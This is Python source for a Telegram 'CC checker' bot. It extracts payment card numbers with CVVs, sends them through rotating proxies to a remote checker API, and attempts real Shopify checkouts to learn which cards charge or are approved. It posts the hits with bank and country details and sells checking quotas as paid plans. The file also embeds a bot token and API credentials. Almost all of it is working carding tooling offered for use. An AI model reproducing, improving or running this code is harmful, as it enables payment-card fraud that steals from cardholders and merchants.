from telethon import TelegramClient, events, Button
from telethon.errors import FloodWaitError
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime

API_ID = 28177911
API_HASH = 'f5427f10015531a47beec9eab2a8dc6f'
BOT_TOKEN = '8842461714:AAE4OdAV55gSszFGDdeIl3Z6e17ze6V4kwY'
ADMIN_ID = [6191213047]
CHECKER_API_URL = 'http://91.188.254.40:5000/shopify'

PREMIUM_USERS_FILE = "premium_users.txt"
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'

CHANNEL_LINK = "https://t.me/+j_1mMilsuCI1MTRk"
FREE_CHANNEL_ID = -1003606904592

bot = TelegramClient('checker_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Global HTTP session with connection pooling
async def get_http_session():
    if not hasattr(get_http_session, '_session') or get_http_session._session.closed:
        connector = aiohttp.TCPConnector(
            limit=200,
            limit_per_host=30,
            ttl_dns_cache=300
        )
        get_http_session._session = aiohttp.ClientSession(connector=connector)
    return get_http_session._session

active_sessions = {}

# Rate limiting + FloodWait handler
_last_msg_time = {}
_MSG_DELAY = 1.5  # per-user 1.5s gap

async def safe_send(coro, user_id=None, retries=3):
    if user_id is not None:
        now = time.time()
        last = _last_msg_time.get(user_id, 0)
        gap = now - last
        if gap < _MSG_DELAY:
            await asyncio.sleep(_MSG_DELAY - gap)
        _last_msg_time[user_id] = time.time()
    for attempt in range(retries):
        try:
            return await coro
        except FloodWaitError as e:
            wait = e.seconds
            print(f"[FloodWait] {wait}s")
            if wait > 30:
                print(f"[FloodWait] Too long ({wait}s), skipping.")
                return None
            await asyncio.sleep(wait + 1)
        except Exception as e:
            err = str(e)
            # Same content pe edit — silently ignore
            if 'not modified' in err.lower() or 'message was not modified' in err.lower():
                return None
            print(f"[safe_send] {e}")
            return None
    return None

# Failed proxy cache — {proxy: failed_count}
_failed_proxy_cache = {}
_proxy_fail_count = {}
PROXY_FAIL_TIMEOUT = 300  # 5 min
PROXY_MAX_FAILS = 3  # 3 baar fail → permanent remove

def get_smart_proxy(proxies):
    """Dead proxies ko skip karo, smart random choose karo"""
    now = time.time()
    # Expired entries clean karo
    expired = [p for p, t in _failed_proxy_cache.items() if now - t > PROXY_FAIL_TIMEOUT]
    for p in expired:
        del _failed_proxy_cache[p]

    # Available proxies — failed wale skip
    available = [p for p in proxies if p not in _failed_proxy_cache]

    # Agar saari proxies failed hain toh cache clear karo
    if not available:
        _failed_proxy_cache.clear()
        available = list(proxies)

    return random.choice(available)

def mark_proxy_failed(proxy):
    """Proxy fail count badhao — 3 baar fail toh proxy.txt se remove"""
    _failed_proxy_cache[proxy] = time.time()
    _proxy_fail_count[proxy] = _proxy_fail_count.get(proxy, 0) + 1

    if _proxy_fail_count[proxy] >= PROXY_MAX_FAILS:
        # proxy.txt se permanently remove karo
        try:
            current = get_file_lines(PROXY_FILE)
            if proxy in current:
                new_list = [p for p in current if p != proxy]
                with open(PROXY_FILE, 'w', encoding='utf-8') as f:
                    for p in new_list:
                        f.write(f"{p}\n")
                print(f"[proxy] Auto-removed dead proxy: {proxy}")
        except Exception as e:
            print(f"[proxy] Remove error: {e}")
        # Cache se bhi hatao
        _failed_proxy_cache.pop(proxy, None)
        _proxy_fail_count.pop(proxy, None)

PREMIUM_EMOJI_IDS = {
    "✅": "6088893844693195262", "❌": "6089287409726397492", "🔥": "5116414868357907335",
    "⚡": "5219943216781995020", "💳": "5447453226498552490", "💠": "5870498447068502918",
    "📝": "5444860552310457690", "🌐": "5447602197439218445", "📊": "5445146408153806223",
    "📦": "5303102515301083665", "📋": "5444931419270839381", "⏳": "5258113901106580375",
    "🚀": "4904936030232117798", "⚠️": "4915853119839011973", "💎": "5197350061012436657",
    "👋": "5134476056241112076", "💡": "5301275719681190738", "📈": "5134457377428341766",
    "🔢": "5305652587708572354", "🔌": "5364052602357044385", "⭐": "5343636681473935403",
    "🆓": "5406756500108501710", "👑": "5303547611351902889", "🔍": "5258396243666681152",
    "⏱️": "5303243514782443814", "💥": "5122933683820430249", "🆔": "5447311106030726740",
    "👤": "5445174334031166029", "📅": "5116575178012235794", "🔄": "5454245266305604993",
    "🏦": "5303159080020372094", "🥰": "5881784744949062058", "😱": "5868517294618975202",
    "🔷": "5258024802010026053", "🔑": "5454386656628991407", "📆": "5454074580010295588",
    "👥": "5454371323595744068", "🥕": "5116599934203724812", "🌳": "5305346287820895195",
    "🦉": "5123344136665039833", "🍑": "5258121851091043775", "💪": "5305622454218024328",
    "🌝": "5404494035891023578", "📁": "5447408120752013199", "ℹ️": "5289930378885214069",
    "💀": "5231338559587257737", "📢": "5116445341150872576", "💰": "5283232570660634549",
    "🔘": "5219901967916084166", "🔗": "5447479640547428304", "👇": "5305618829265628111",
    "📌": "5447187153274567373", "💸": "5447579253723918909", "▶️": "5447135467638125511",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958", "🚫": "5116151848855667552",
    "🛒": "5447319442562251569", "🔧": "4904936030232117798", "⛔️": "5275969776668134187",
    "🥲": "4904468402782864209", "☠️": "5231338559587257737", "📸": "5445344161333015312",
    "💬": "5447510826304959724", "😺": "5118590136149345664", "🌍": "5303440357428586778",
    "🔹": "5429436388447655367", "📹": "5445158077579952110", "📡": "5447448489149625830",
    "📍": "5447187153274567373", "🔐": "5258476306152038031", "🤖": "5359704871387806825"
}

def premium_emoji(text: str) -> str:
    if not text:
        return text
    result = text
    for emoji, emoji_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

def get_main_menu_keyboard(user_id=None):
    buttons = [
        [Button.inline(" Cmd", b"show_cmds", style="primary"),
         Button.url(" Channel", "https://t.me/+j_1mMilsuCI1MTRk", style="primary")]
    ]
    
    if user_id and user_id in ADMIN_ID:
        buttons.append([Button.inline(" Admin Panel", b"admin_panel", style="primary")])
    
    return buttons


def get_file_lines(filepath):
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"Error reading {filepath}: {e}")
        return []

def load_sites():
    return get_file_lines(SITES_FILE)

def load_proxies():
    return get_file_lines(PROXY_FILE)

# =========== PREMIUM JSON SYSTEM ===========
PREMIUM_JSON = 'premium.json'

# Plan definitions: name -> (days, limit)
PLANS = {
    'basic':    {'days': 1,   'limit': 500,   'emoji': '🥉', 'price': '$1'},
    'standard': {'days': 5,   'limit': 1000,  'emoji': '🥈', 'price': '$2'},
    'premium':  {'days': 15,  'limit': 2000,  'emoji': '🥇', 'price': '$7'},
    'vip':      {'days': 30,  'limit': 5000,  'emoji': '👑', 'price': '$15'},
    'lifetime': {'days': -1,  'limit': 10000, 'emoji': '♾️', 'price': 'Custom'},
}

def _load_premium_data():
    if not os.path.exists(PREMIUM_JSON):
        return {}
    try:
        with open(PREMIUM_JSON, 'r', encoding='utf-8') as f:
            return json.load(f)
    except Exception:
        return {}

def _save_premium_data(data):
    try:
        with open(PREMIUM_JSON, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"[premium] Save error: {e}")

def _cleanup_expired():
    data = _load_premium_data()
    now = time.time()
    expired = [uid for uid, info in data.items()
               if isinstance(info, dict) and info.get('expiry', -1) != -1 and now > info['expiry']]
    # legacy flat format bhi handle karo
    expired += [uid for uid, info in data.items()
                if not isinstance(info, dict) and info != -1 and now > info]
    for uid in expired:
        del data[uid]
        print(f"[premium] Expired: {uid}")
    if expired:
        _save_premium_data(data)
    return expired

def _get_user_info(user_id):
    """Returns (expiry, plan, limit) for a user. Handles old flat format too."""
    data = _load_premium_data()
    uid = str(user_id)
    if uid not in data:
        return None, None, None
    info = data[uid]
    # New format: dict
    if isinstance(info, dict):
        return info.get('expiry', -1), info.get('plan', 'vip'), info.get('limit', 5000)
    # Old flat format: just expiry timestamp
    return info, 'vip', 5000

def is_premium(user_id):
    if int(user_id) in ADMIN_ID:
        return True
    # legacy premium_users.txt check
    legacy = get_file_lines(PREMIUM_USERS_FILE)
    if str(user_id) in legacy:
        return True
    expiry, plan, limit = _get_user_info(user_id)
    if expiry is None:
        return False
    if expiry == -1:
        return True
    if time.time() > expiry:
        data = _load_premium_data()
        uid = str(user_id)
        if uid in data:
            del data[uid]
            _save_premium_data(data)
        return False
    return True

def get_user_chk_limit(user_id):
    """Returns CC check limit for user based on their plan."""
    if int(user_id) in ADMIN_ID:
        return 10000
    legacy = get_file_lines(PREMIUM_USERS_FILE)
    if str(user_id) in legacy:
        return 5000  # legacy users get vip limit
    expiry, plan, limit = _get_user_info(user_id)
    if expiry is None:
        return 0
    return limit if limit else 5000

def get_premium_expiry_str(user_id):
    expiry, plan, limit = _get_user_info(user_id)
    if expiry is None:
        return None
    if expiry == -1:
        return "♾️ Lifetime"
    remaining = expiry - time.time()
    if remaining <= 0:
        return "❌ Expired"
    days = int(remaining // 86400)
    hours = int((remaining % 86400) // 3600)
    return f"⏳ {days}d {hours}h remaining"


DEAD_INDICATORS = (
    # Site/status errors
    'site error! status:', 'site error', 'site errors', 'site dead', 'site not supported', 'not supported',
    'all sites dead', 'all sites unavailable', 'invalid response from site', 'invalid response', 'no valid response',
    # Submit/rejected
    'submit rejected', 'submit_rejected',
    # Unknown results
    'unknown result', 'no result',
    # Session/token errors
    'no_session_token', 'no session token', 'failed to get session token',
    'unable to get', 'unable to get payment token',
    # JSON/response errors
    'expecting value: line 1 column 1', 'expecting value:', 'invalid json', 'invalid json response',
    'invalid json in submit response', '<!doctype', '<html', '<b>', '</b>',
    # curl errors
    'failed to perform', 'curl: (7)', 'curl: (92)', 'curl: (6)', 'curl: (28)',
    # DNS/network errors
    'getaddrinfo() thread failed', 'getaddrinfo failed',
    'failed to connect', 'connection refused',
    # Checkout/product errors
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'failed to detect product', 'failed to create checkout', 'no valid products',
    'failed to tokenize card', 'all tokenization endpoints failed', 'failed to get proposal data',
    'no checkout token found', 'checkout token not found', 'no checkout token', 'checkout token is empty',
    'tokenize_fail', 'tokenize fail',
    # URL/request errors
    'invalid url', 'error in 1st req', 'error in 1 req',
    'url rejected', 'malformed input',
    # Connection/SSL errors
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    # HTTP status codes
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'handle error', 'http 404',
    'http 429', 'http_429', 'httperror429', 'too many requests',
    'status: 429', 'status 429', 'status: 422', 'status 422', 'http 422',
    # Delivery/address errors
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    # Amount errors
    'amount_too_small', 'amount too small',
    'payments_positive_amount_expected', 'positive_amount_expected', 'positive amount expected',
    'price: $0.00', '$0.00',
    # Captcha
    'captcha_required', 'captcha required',
    # Cart errors
    'cart add failed after retries', 'cart failed', 'cart add failed',
    # NoneType errors
    "nonetype' object has no attribute 'get", 'nonetype object has no attribute',
    # Generic/misc
    'generic_error', 'generic error',
    'max retries exceeded',
    'failed',
    'all products sold out',
    # Shopify checkout errors
    'artifact_dissatisfaction', 'merchandise_expected', 'price_mismatch',
    'merchandise_expected_price_mismatch',
    # Login required
    'site requires login', 'requires login', 'login required',
    # Validation errors
    'validation_custom', 'validation custom', 'custom validation',
    # Currency mismatch
    'buyer_identity_presentment_currency_does_not_match',
    'presentment_currency_does_not_match', 'currency_does_not_match',
    # Payment terms mismatch
    'payments_payment_flexibility_terms_id_mismatch',
    'payment_flexibility_terms_id_mismatch', 'terms_id_mismatch',
    # Step 1 errors
    'step 1 failed', 'missing stableid', 'missing buildid', 'missing sourcetoken',
    'stableid', 'buildid', 'sourcetoken',
    # Additional errors
    'site error! status: 401', 'status: 401', '401',
    'delivery_delivery_line_detail_changed',
    'invalid_purchase_type', 'invalid purchase type',
    'site errors: generic_error', 'site errors: generic error',
    'inventoryreservationfailure', 'inventory reservation failure',
)

def is_site_dead(response_msg, gateway, price):
    if not response_msg:
        return True

    if not gateway or gateway == "Unknown":
        return True

    price_str = str(price)
    if price_str in ["-", "$-", "$0", "$0.0", "0", "$0.00", "0.0", "0.00"]:
        return True

    response_lower = response_msg.lower()
    if any(indicator in response_lower for indicator in DEAD_INDICATORS):
        return True

    return False

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return 'BIN Info Not Found', '-', '-', '-', '-', ''
                response_text = await res.text()
                try:
                    data = json.loads(response_text)
                    brand = data.get('brand', '-')
                    bin_type = data.get('type', '-')
                    level = data.get('level', '-')
                    bank = data.get('bank', '-')
                    country = data.get('country_name', '-')
                    flag = data.get('country_flag', '')
                    return brand, bin_type, level, bank, country, flag
                except json.JSONDecodeError:
                    return '-', '-', '-', '-', '-', ''
    except Exception:
        return '-', '-', '-', '-', '-', ''

def normalize_proxy(proxy):
    """
    Saare proxy formats accept karo, hamesha ip:port:user:pass return karo.
    Supported formats:
      ip:port:user:pass
      user:pass:ip:port
      ip:port@user:pass
      user:pass@ip:port
      http://user:pass@ip:port
      socks5://user:pass@ip:port
      ip:port (no auth)
    IP alphanumeric + symbols (hostnames) bhi valid hain.
    """
    if not proxy:
        return None
    proxy = proxy.strip()

    # Protocol strip
    for prefix in ('http://', 'https://', 'socks5://', 'socks4://'):
        if proxy.lower().startswith(prefix):
            proxy = proxy[len(prefix):]
            break

    # @ wala format
    if '@' in proxy:
        left, right = proxy.split('@', 1)
        left_parts = left.split(':', 1)
        right_parts = right.split(':', 1)
        if len(left_parts) == 2 and len(right_parts) == 2:
            # user:pass@ip:port
            if right_parts[1].isdigit():
                return f"{right_parts[0]}:{right_parts[1]}:{left_parts[0]}:{left_parts[1]}"
            # ip:port@user:pass
            if left_parts[1].isdigit():
                return f"{left_parts[0]}:{left_parts[1]}:{right_parts[0]}:{right_parts[1]}"
        return None

    parts = proxy.split(':')

    if len(parts) == 2:
        # ip:port (no auth)
        if parts[1].isdigit():
            return f"{parts[0]}:{parts[1]}::"
        return None

    if len(parts) == 4:
        # ip:port:user:pass
        if parts[1].isdigit():
            return f"{parts[0]}:{parts[1]}:{parts[2]}:{parts[3]}"
        # user:pass:ip:port
        if parts[3].isdigit():
            return f"{parts[2]}:{parts[3]}:{parts[0]}:{parts[1]}"
        return None

    return None


def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

async def check_card(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}

        if not site.startswith('http'):
            site = f'https://{site}'

        # normalize_proxy se hamesha ip:port:user:pass milega
        proxy_str = normalize_proxy(proxy) if proxy else None

        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'

        timeout = aiohttp.ClientTimeout(total=60)
        session = await get_http_session()
        try:
            async with session.get(url, timeout=timeout) as resp:
                if resp.status != 200:
                    return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
                try:
                    raw = await resp.json(content_type=None)
                except:
                    text = await resp.text()
                    return {'status': 'Site Error', 'message': f'Invalid JSON: {text[:100]}', 'card': card, 'retry': True}
        except Exception as e:
            return {'status': 'Site Error', 'message': f'Request failed: {str(e)}', 'card': card, 'retry': True}

        response_msg = raw.get('Response', '')
        price = raw.get('Price', '-')
        if price != '-' and price != 0:
            price = f"${price}"
        gateway = raw.get('Gateway', 'Shopify')
        status_api = raw.get('Status', False)

        if is_site_dead(response_msg, gateway, price):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gateway, 'price': price}

        response_lower = response_msg.lower()

        if 'charged' in response_lower or 'order_placed' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        elif 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}

        # Silent approved — sirf txt me, realtime hit nahi
        elif any(key in response_lower for key in [
            'otp_required', 'otp required',
            '3d', '3d secure', '3ds', '3ds_required',
            'authentication required', 'authentication_required',
            'challenge required', 'redirecting to bank',
            'bank verification', 'send code', 'enter code',
            'verification required', 'verify'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price, 'silent': True}

        # Realtime hit approved
        elif any(key in response_lower for key in [
            'approved', 'success',
            'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip', 'cvv issue',
            'authenticate',
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price, 'silent': False}
        else:
            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def check_card_with_retry(card, sites, proxies, max_retries=3):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-'}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-'}

    current_proxy = get_smart_proxy(proxies)
    generic_error_retries = 0
    max_generic_retries = 2

    for attempt in range(max_retries):
        site = random.choice(sites)

        # Attempt 3 pe proxy change karo
        if attempt == 2:
            mark_proxy_failed(current_proxy)
            current_proxy = get_smart_proxy(proxies)

        result = await check_card(card, site, current_proxy)

        # GENERIC_ERROR special handling
        if result.get('retry') and 'generic' in result.get('message', '').lower():
            while generic_error_retries < max_generic_retries:
                generic_error_retries += 1
                await asyncio.sleep(1.0)
                site = random.choice(sites)
                mark_proxy_failed(current_proxy)
                current_proxy = get_smart_proxy(proxies)
                result = await check_card(card, site, current_proxy)
                if not result.get('retry'):
                    return result
                if 'generic' not in result.get('message', '').lower():
                    break
            last_result = result
            break

        if not result.get('retry'):
            return result

        # Site error pe proxy failed mark karo
        mark_proxy_failed(current_proxy)
        current_proxy = get_smart_proxy(proxies)
        last_result = result
        if attempt < max_retries - 1:
            await asyncio.sleep(0.3)

    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}

    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-'}

async def send_realtime_hit(user_id, result, hit_type, username):
    if hit_type == "Charged":
        status_text = "💎 𝑪𝑯𝑨𝑹𝑮𝑬𝑫"
    else:
        status_text = "✅ 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫"

    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])

    message = f"""{status_text}

💳 CC <code>{result['card']}</code>

🛒 Gateway {result.get('gateway', 'Unknown')}
📝 Response {result['message'][:150]}
💸 Price {result.get('price', '-')}

🆔 BIN Info {brand} - {bin_type} - {level}
🏦 Bank {bank}
🥰 Country {country} {flag}

💡 Made by @Phantxdead_XD"""

    try:
        sent = await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
        if hit_type == 'Charged':
            try:
                await bot.pin_message(user_id, sent.id, notify=False)
            except:
                pass
    except:
        pass

def mask_card(card):
    parts = card.split('|')
    if len(parts) != 4:
        return card
    number, mm, yy, cvv = parts
    masked_number = number[:4] + '*' * (len(number) - 4)
    return f"{masked_number}|{mm}|{yy}|***"

async def update_progress(user_id, message_id, results, current_attempt_count, chat_id=None):
    is_group = chat_id and chat_id != user_id

    last_card = results.get('last_card', 'None')
    display_card = mask_card(last_card) if is_group else last_card

    progress_text = f"""🔄 Checking Progress...

💳 Card    » <code>{display_card}</code>
📝 Response » {results.get('last_response', 'Waiting...')[:30]}
💰 Price   » {results.get('last_price', '-')}

✅ Charged  » {len(results['charged'])}
🔥 Approved » {len(results['approved'])}
❌ Declined » {len(results['dead'])}
📊 Progress » {results.get('checked', 0)}/{results.get('total', 0)}

⚡ Powered by @Phantxdead_XD"""

    buttons = [
        [Button.inline(f"✅ 𝐂 𝐇 𝐀 𝐑 𝐆 𝐄 𝐃 ➜ {len(results['charged'])}", b"none", style="success")],
        [Button.inline(f"🔥 𝐀 𝐏 𝐏 𝐑 𝐎 𝐕 𝐄 𝐃 ➜ {len(results['approved'])}", b"none", style="primary")],
        [Button.inline(f"❌ 𝐃 𝐄 𝐂 𝐋 𝐈 𝐍 𝐄 𝐃 ➜ {len(results['dead'])}", b"none", style="danger")],
        [Button.inline("🛑 𝐒  𝐓  𝐎  𝐏", f"stop_{user_id}".encode(), style="danger")]
    ]

    target = chat_id if chat_id else user_id
    try:
        if is_group:
            await safe_send(bot.edit_message(target, message_id, premium_emoji(progress_text), parse_mode='html'), user_id=user_id)
        else:
            await safe_send(bot.edit_message(target, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html'), user_id=user_id)
    except:
        pass
async def update_progress_v2(user_id, message_id, results, current_attempt_count, chat_id=None, masked=False):
    """Masked=True → premium group (cards masked), False → free user (unmasked)"""
    is_group = chat_id and chat_id != user_id

    last_card = results.get('last_card', 'None')
    display_card = mask_card(last_card) if masked else last_card

    progress_text = f"""🔄 Checking Progress...

💳 Card    » <code>{display_card}</code>
📝 Response » {results.get('last_response', 'Waiting...')[:30]}
💰 Price   » {results.get('last_price', '-')}

✅ Charged  » {len(results['charged'])}
🔥 Approved » {len(results['approved'])}
❌ Declined » {len(results['dead'])}
📊 Progress » {results.get('checked', 0)}/{results.get('total', 0)}

⚡ Powered by @Phantxdead_XD"""

    buttons = [
        [Button.inline(f"✅ 𝐂 𝐇 𝐀 𝐑 𝐆 𝐄 𝐃 ➜ {len(results['charged'])}", b"none", style="success")],
        [Button.inline(f"🔥 𝐀 𝐏 𝐏 𝐑 𝐎 𝐕 𝐄 𝐃 ➜ {len(results['approved'])}", b"none", style="primary")],
        [Button.inline(f"❌ 𝐃 𝐄 𝐂 𝐋 𝐈 𝐍 𝐄 𝐃 ➜ {len(results['dead'])}", b"none", style="danger")],
        [Button.inline("🛑 𝐒  𝐓  𝐎  𝐏", f"stop_{user_id}".encode(), style="danger")]
    ]

    target = chat_id if chat_id else user_id
    try:
        if is_group:
            await safe_send(bot.edit_message(target, message_id, premium_emoji(progress_text), parse_mode='html'), user_id=user_id)
        else:
            await safe_send(bot.edit_message(target, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html'), user_id=user_id)
    except:
        pass

async def send_realtime_hit_to(target_id, result, hit_type, username):
    """Hit kisi bhi target (group ya DM) mein bhejo — unmasked"""
    if hit_type == "Charged":
        status_text = "💎 𝑪𝑯𝑨𝑹𝑮𝑬𝑫"
    else:
        status_text = "✅ 𝑨𝑷𝑷𝑹𝑶𝑽𝑬𝑫"

    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])

    message = f"""{status_text}

💳 CC <code>{result['card']}</code>

🛒 Gateway {result.get('gateway', 'Unknown')}
📝 Response {result['message'][:150]}
💸 Price {result.get('price', '-')}

🆔 BIN Info {brand} - {bin_type} - {level}
🏦 Bank {bank}
🥰 Country {country} {flag}

💡 Made by @Phantxdead_XD"""

    try:
        await bot.send_message(target_id, premium_emoji(message), parse_mode='html')
    except:
        pass

async def send_final_results(target_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"

    if not hits_text:
        hits_text = "No hits found"

    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')

    summary = f"""✅ Check Complete! ✅

📊 Results:
   ┣ ✅ Charged: {len(results['charged'])}
   ┣ 🔥 Approved: {len(results['approved'])}
   ┣ ❌ Declined: {len(results['dead'])}
   ┗ 📊 Total: {results['total']}

Hits:
{hits_text}

💡 Made by  @Phantxdead_XD"""

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"ShopiFY_Result{timestamp}.txt"

    async with aiofiles.open(filename, 'w') as f:
        await f.write("CC CHECKER RESULTS\n")
        
        await f.write(f"CHARGED ({len(results['charged'])}):\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        
        await f.write(f"APPROVED ({len(results['approved'])}):\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        
        await f.write(f"DECLINED ({len(results['dead'])}):\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")

    await safe_send(bot.send_message(target_id, premium_emoji(summary), file=filename, parse_mode='html'), user_id=target_id)

    try:
        os.remove(filename)
    except:
        pass


async def test_site(site, proxy_list, proxies_pool):
    test_card = "4031630422575208|01|2030|280"
    if not site.startswith('http'):
        site = f'https://{site}'

    for attempt in range(2):
        proxy = proxy_list[attempt] if attempt < len(proxy_list) else random.choice(proxies_pool)
        proxy_str = normalize_proxy(proxy) if proxy else None

        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}'
        if proxy_str:
            url += f'&proxy={proxy_str}'

        try:
            timeout = aiohttp.ClientTimeout(total=60)
            session = await get_http_session()
            async with session.get(url, timeout=timeout) as resp:
                if resp.status != 200:
                    await asyncio.sleep(0.3)
                    continue
                try:
                    raw = await resp.json(content_type=None)
                except:
                    await asyncio.sleep(0.3)
                    continue

            if not raw:
                await asyncio.sleep(0.3)
                continue

            response_msg = str(raw.get('Response', '')).lower()
            gateway = str(raw.get('Gateway', '')).lower()
            price = raw.get('Price', 0)

            # GENERIC_ERROR pe seedha dead
            if 'generic' in response_msg:
                return {'site': site, 'status': 'dead', 'gateway': gateway, 'price': 0, 'response': response_msg}

            try:
                price_val = float(str(price).replace('$', '').strip())
            except:
                price_val = 0

            price_ok = 0.01 <= price_val < 11
            gateway_ok = 'shopify' in gateway
            response_ok = any(r in response_msg for r in [
                'card_declined', 'card declined',
                'incorrect_zip', 'incorrect zip',
                'otp_required', 'otp required',
                '3ds_required', '3d_secure', '3ds required', '3d secure',
                'authentication_required', 'authentication required',
                'insufficient_funds', 'insufficient funds',
            ])

            if price_ok and gateway_ok and response_ok:
                return {'site': site, 'status': 'alive', 'gateway': gateway, 'price': price_val, 'response': response_msg}
            else:
                return {'site': site, 'status': 'dead', 'gateway': gateway, 'price': price_val, 'response': response_msg}

        except:
            await asyncio.sleep(0.3)
            continue

    return {'site': site, 'status': 'dead', 'gateway': '-', 'price': 0, 'response': 'max retries exceeded'}

async def test_proxy(proxy):
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, port, user, password = proxy_parts
            proxy_url = f'http://{user}:{password}@{ip}:{port}'
        elif len(proxy_parts) == 2:
            ip, port = proxy_parts
            proxy_url = f'http://{ip}:{port}'
        else:
            proxy_url = f'http://{proxy}'

        # Test card + dummy site se API pe test karo
        test_url = f'{CHECKER_API_URL}?site=https://kith.com&cc=4111111111111111|01|2030|123&proxy={proxy}'

        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(test_url) as res:
                if res.status == 200:
                    return {'proxy': proxy, 'status': 'alive'}
                else:
                    return {'proxy': proxy, 'status': 'dead'}
    except Exception as e:
        return {'proxy': proxy, 'status': 'dead'}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    is_prem = is_premium(user_id)
    
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"
    
    welcome_text = f"""👋 Hey @{username}!

🎁 How to use:
   ➥ Add proxy: <code>/addproxy</code>
   ➥ Check Single: <code>/sh card|mm|yy|cvv</code>
   ➥ Check Mass: <code>/chk .txt check</code>
   ➥ Plan: <code>/plan</code>

💡 Made by  @Phantxdead_XD"""
    
    buttons = get_main_menu_keyboard(user_id)
    
    await event.reply(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_commands_callback(event):
    commands_text = """📋 User Commands

🛒 Shopify
├─ <code>/sh cc|mm|yy|cvv</code> → Check single card
├─ <code>/chk</code> → Mass check from .txt file
└─ <code>/bin 444488</code> → BIN lookup

🔌 Proxy
└─ <code>/addproxy</code> → Add proxies"""
    
